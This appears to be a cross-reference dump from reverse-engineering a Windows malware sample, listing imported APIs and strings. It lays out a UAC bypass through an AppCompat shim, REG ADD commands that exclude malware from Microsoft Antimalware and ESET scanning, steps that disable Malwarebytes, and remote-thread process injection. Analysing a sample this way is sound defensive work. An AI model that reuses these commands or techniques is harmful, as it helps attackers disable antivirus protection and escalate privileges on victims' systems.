reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401a18	0x407078	import	0x4019cf	KERNEL32.dll.DeleteFileA
0x401a69	0x40707c	import	0x4019cf	KERNEL32.dll.GetWindowsDirectoryA
0x401a6f	0x407644	string	0x4019cf	\AppPatch\Custom\{f48a0c57-7c48-461c-9957-ab255ddc986e}.sdb
0x401a86	0x4075f0	string	0x4019cf	SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\iscsicli.exe\
0x401a96	0x407578	string	0x4019cf	SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\{f48a0c57-7c48-461c-9957-ab255ddc986e}\
0x401aef	0x407080	import	0x401aac	KERNEL32.dll.Sleep
0x401b16	0x407444	string	0x401aff	marker_UAC_bypassed
0x401b1b	0x407414	string	0x401aff	SOFTWARE\Microsoft\Windows NT\CurrentVersion\
0x401b3c	0x407080	import	0x401aff	KERNEL32.dll.Sleep
0x401b64	0x401b6a	string	0x401aff	hXt@
0x401b6a	0x407458	string	0x401aff	TRUE
0x401b74	0x407084	import	0x401aff	KERNEL32.dll.lstrcmpiA
0x401b9a	0x407184	import	0x401b87	USER32.dll.GetClassNameA
0x401ba4	0x4076b0	string	0x401b87	$$$Secure UAP
0x401bad	0x407048	import	0x401b87	KERNEL32.dll.lstrcmpA
0x401bbc	0x407180	import	0x401b87	USER32.dll.SwitchToThisWindow
0x401c2a	0x4070e4	import	0x401be3	KERNEL32.dll.GetModuleHandleA
0x401c31	0x407110	import	0x401be3	KERNEL32.dll.GetModuleFileNameW
0x401c51	0x4076e0	string	0x401be3	runas
0x401c5d	0x407094	import	0x401be3	KERNEL32.dll.lstrcatW
0x401ca8	0x4076c0	string	0x401be3	cmd.exe
0x401cb8	0x407090	import	0x401be3	KERNEL32.dll.CreateThread
0x401cbf	0x4070d8	import	0x401be3	KERNEL32.dll.CloseHandle
0x401ccb	0x407164	import	0x401be3	SHELL32.dll.ShellExecuteExW
0x401ced	0x40708c	import	0x401be3	KERNEL32.dll.ExitProcess
0x401d2d	0x407060	import	0x401d15	KERNEL32.dll.CreateFileA
0x401d3e	0x4070a4	import	0x401d15	KERNEL32.dll.GetProcessHeap
0x401d48	0x4070a0	import	0x401d15	KERNEL32.dll.HeapAlloc
0x401d74	0x40709c	import	0x401d15	KERNEL32.dll.SetFilePointer
0x401d85	0x40705c	import	0x401d15	KERNEL32.dll.WriteFile
0x401d93	0x407098	import	0x401d15	KERNEL32.dll.HeapFree
0x401d9c	0x4070d8	import	0x401d15	KERNEL32.dll.CloseHandle
0x401dc1	0x4070b8	import	0x401dae	KERNEL32.dll.FindResourceA
0x401e0a	0x4070b4	import	0x401dae	KERNEL32.dll.SizeofResource
0x401e15	0x4070b0	import	0x401dae	KERNEL32.dll.LoadResource
0x401e1f	0x4070ac	import	0x401dae	KERNEL32.dll.LockResource
0x401e31	0x40770c	string	0x401dae	temp
0x401e36	0x40706c	import	0x401dae	KERNEL32.dll.GetEnvironmentVariableA
0x401e48	0x407064	import	0x401dae	KERNEL32.dll.lstrcatA
0x401e7b	0x407700	string	0x401dae	.exe
0x401e89	0x407078	import	0x401dae	KERNEL32.dll.DeleteFileA
0x401ec1	0x4076ec	string	0x401dae	:Zone.Identifier
0x401f1b	0x4070a8	import	0x401dae	KERNEL32.dll.CreateProcessA
0x401f2c	0x40774c	string	0x401dae	EXE1
0x401f36	0x407744	string	0x401dae	EXE2
0x401f42	0x40773c	string	0x401dae	EXE3
0x401f4e	0x407734	string	0x401dae	EXE4
0x401f5a	0x40772c	string	0x401dae	EXE5
0x401f66	0x407724	string	0x401dae	EXE6
0x401f72	0x40771c	string	0x401dae	EXE7
0x401f7e	0x407714	string	0x401dae	EXE8
0x401f8c	0x407754	string	0x401f8c	RunYourMalwareHere
0x401f9d	0x407080	import	0x401f8c	KERNEL32.dll.Sleep
0x401fbb	0x401f2c	string	0x401f8c	hLw@
0x401fc1	0x407768	string	0x401fc1	RunYourMalwareHereWithHighIntegrityLevel
0x401fcc	0x401f2c	string	0x401fc1	hLw@
0x40200c	0x4074a0	string	0x401fd1	GetNativeSystemInfo
0x402011	0x407490	string	0x401fd1	kernel32.dll
0x402016	0x4070e4	import	0x401fd1	KERNEL32.dll.GetModuleHandleA
0x40201d	0x4070e8	import	0x401fd1	KERNEL32.dll.GetProcAddress
0x40202f	0x4070dc	import	0x401fd1	KERNEL32.dll.GetSystemInfo
0x402039	0x4070e0	import	0x401fd1	KERNEL32.dll.GetVersionExA
0x402056	0x407c30	string	0x401fd1	code1 executed in spolsvr.exe
0x402060	0x407bc0	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.exe /t REG_DWORD /d 0
0x40206c	0x407b50	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.dll /t REG_DWORD /d 0
0x402078	0x407ae0	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Extensions " /v *.tmp /t REG_DWORD /d 0
0x402084	0x407a68	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v afwqs.exe /t REG_DWORD /d 0
0x402090	0x4079f0	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v rgjdu.exe /t REG_DWORD /d 0
0x40209c	0x407978	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v explorer.exe /t REG_DWORD /d 0
0x4020a8	0x407900	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v spoolsv.exe /t REG_DWORD /d 0
0x4020b4	0x407888	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v rundll32.exe /t REG_DWORD /d 0
0x4020c0	0x407810	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v consent.exe /t REG_DWORD /d 0
0x4020cc	0x407798	string	0x401fd1	REG ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Processes " /v svchost.exe /t REG_DWORD /d 0
0x4020dc	0x407dc0	string	0x401fd1	code1 executed in ekrn.exe
0x4020e6	0x407d08	string	0x401fd1	REG ADD "HKLM\SOFTWARE\ESET\ESET Security\CurrentVersion\Plugins\01000600\Profiles\@My profile\Excludes\Node_00009999 " /v Path /t REG_EXPAND_SZ /d "c:\your_file_to_exclude.exe"
0x4020f2	0x407c50	string	0x401fd1	REG ADD "HKLM\SOFTWARE\ESET\ESET Security\CurrentVersion\Plugins\01000600\Profiles\@My profile\Excludes\Node_00009999 " /v Path /t REG_EXPAND_SZ /d "c:\your_file_to_exclude2.exe"
0x402120	0x4070ec	import	0x402102	KERNEL32.dll.GetCurrentProcess
0x402127	0x40700c	import	0x402102	ADVAPI32.dll.OpenProcessToken
0x402138	0x407ddc	string	0x402102	SeDebugPrivilege
0x40213e	0x407034	import	0x402102	ADVAPI32.dll.LookupPrivilegeValueA
0x40215e	0x407030	import	0x402102	ADVAPI32.dll.AdjustTokenPrivileges
0x402167	0x4070d8	import	0x402102	KERNEL32.dll.CloseHandle
0x40217f	0x4070e4	import	0x402173	KERNEL32.dll.GetModuleHandleA
0x402198	0x4070d0	import	0x402173	KERNEL32.dll.VirtualFreeEx
0x4021aa	0x4070cc	import	0x402173	KERNEL32.dll.VirtualAllocEx
0x4021b7	0x407e38	string	0x402173	VirtualAllocEx failed with error
0x4021c9	0x4070c8	import	0x402173	KERNEL32.dll.VirtualQueryEx
0x4021df	0x402247	string	0x402173	h$~@
0x4021eb	0x402247	string	0x402173	h$~@
0x40220b	0x4070c4	import	0x402173	KERNEL32.dll.VirtualProtectEx
0x40221b	0x4070c0	import	0x402173	KERNEL32.dll.WriteProcessMemory
0x402247	0x407e24	string	0x402173	RtlCreateUserThread
0x40224c	0x407e18	string	0x402173	ntdll.dll
0x402251	0x4070bc	import	0x402173	KERNEL32.dll.LoadLibraryA
0x402258	0x4070e8	import	0x402173	KERNEL32.dll.GetProcAddress
0x40227c	0x407df0	string	0x402173	CreateRemoteThread failed with error
0x4022e8	0x407084	import	0x40228e	KERNEL32.dll.lstrcmpiA
0x4022fe	0x407044	import	0x40228e	KERNEL32.dll.OpenProcess
0x40230a	0x407e5c	string	0x40228e	OpenProcess failed with error
0x402323	0x4070d8	import	0x40228e	KERNEL32.dll.CloseHandle
0x405f1d	0x407fc4	string	0x402340	ALLUSERSPROFILE
0x405f22	0x40706c	import	0x402340	KERNEL32.dll.GetEnvironmentVariableA
0x405f28	0x407f98	string	0x402340	\Malwarebytes\Malwarebytes Anti-Malware\
0x405f43	0x407f8c	string	0x402340	ProgramData
0x405f48	0x40706c	import	0x402340	KERNEL32.dll.GetEnvironmentVariableA
0x405f54	0x407f98	string	0x402340	\Malwarebytes\Malwarebytes Anti-Malware\
0x405f6f	0x407048	import	0x402340	KERNEL32.dll.lstrcmpA
0x405fa4	0x407f7c	string	0x402340	exclusions.dat
0x405fc9	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x40600d	0x407f60	string	0x402340	Configuration\settings.conf
0x406032	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x40607a	0x407f40	string	0x402340	Configuration\scheduler.conf
0x40609f	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x4060e1	0x407f7c	string	0x402340	exclusions.dat
0x406106	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x40614a	0x407f60	string	0x402340	Configuration\settings.conf
0x40616f	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x4061b7	0x407f40	string	0x402340	Configuration\scheduler.conf
0x4061dc	0x407078	import	0x402340	KERNEL32.dll.DeleteFileA
0x406216	0x407f34	string	0x402340	ProductPath
0x40621b	0x407ef8	string	0x402340	SYSTEM\CurrentControlSet\services\MBAMProtector\Parameters
0x406237	0x407ecc	string	0x402340	C:\Program Files\Malwarebytes Anti-Malware
0x40624a	0x407ec0	string	0x402340	\mbam.dll
0x40625e	0x4070bc	import	0x402340	KERNEL32.dll.LoadLibraryA
0x406264	0x4070e8	import	0x402340	KERNEL32.dll.GetProcAddress
0x40626c	0x407eb0	string	0x402340	ProtectionStop
0x406274	0x407ea0	string	0x402340	SchedulerStop
0x406282	0x407e88	string	0x402340	SelfProtectionDisable
0x4062b9	0x407080	import	0x402340	KERNEL32.dll.Sleep
0x4062bf	0x407e7c	string	0x402340	mbam.exe
0x4062e1	0x408014	string	0x4062cf	msseces.exe
0x4062f0	0x402056	string	0x4062cf	h0|@
0x4062f5	0x408008	string	0x4062cf	spoolsv.exe
0x406301	0x407ff4	string	0x4062cf	ekrn.exe
0x406315	0x407fe8	string	0x4062cf	ekrn.exe
0x406321	0x407fd4	string	0x4062cf	mbam.exe
0x406373	0x4070e4	import	0x406336	KERNEL32.dll.GetModuleHandleA
0x40637a	0x407074	import	0x406336	KERNEL32.dll.GetModuleFileNameA
0x406380	0x408070	string	0x406336	RegDeleteKeyExA
0x406385	0x408060	string	0x406336	advapi32.dll
0x40638a	0x4070bc	import	0x406336	KERNEL32.dll.LoadLibraryA
0x406391	0x4070e8	import	0x406336	KERNEL32.dll.GetProcAddress
0x406397	0x40804c	string	0x406336	new process runned
0x4063cc	0x401fc1	string	0x406336	hhw@
0x4063de	0x40803c	string	0x406336	not admin
0x4063eb	0x401f8c	string	0x406336	hTw@
0x4063f2	0x408034	string	0x406336	admin
0x40642a	0x407080	import	0x406336	KERNEL32.dll.Sleep
0x40645e	0x4070fc	import	0x40645e	KERNEL32.dll.Process32NextW
0x406464	0x4070f4	import	0x406464	KERNEL32.dll.Process32FirstW
0x40646a	0x4070f0	import	0x40646a	KERNEL32.dll.CreateToolhelp32Snapshot
0x406470	0x407088	import	0x406470	KERNEL32.dll.Process32Next
0x406476	0x40704c	import	0x406476	KERNEL32.dll.Process32First
0x40647c	0x407144	import	0x40647c	MSVCRT.dll.memcpy
0x406482	0x407148	import	0x406482	MSVCRT.dll.strlen
0x406488	0x40714c	import	0x406488	MSVCRT.dll.strcat
0x4064bb	0x407128	import	0x406488	MSVCRT.dll.__set_app_type
0x4064d0	0x40712c	import	0x406488	MSVCRT.dll.__p__fmode
0x4064de	0x407130	import	0x406488	MSVCRT.dll.__p__commode
0x40650a	0x407138	import	0x406488	MSVCRT.dll.__setusermatherr
0x406543	0x407140	import	0x406488	MSVCRT.dll.__getmainargs
0x406592	0x407118	import	0x406488	KERNEL32.dll.GetStartupInfoA
0x40659c	0x4065af	string	0x406488	j\nXPVSS
0x4065b6	0x4070e4	import	0x406488	KERNEL32.dll.GetModuleHandleA
0x4065c6	0x407158	import	0x406488	MSVCRT.dll.exit
0x4065ec	0x407154	import	0x4065ec	MSVCRT.dll._XcptFilter
0x4065f2	0x40713c	import	0x4065f2	MSVCRT.dll._initterm
0x406616	0x407120	import	0x406616	MSVCRT.dll._controlfp
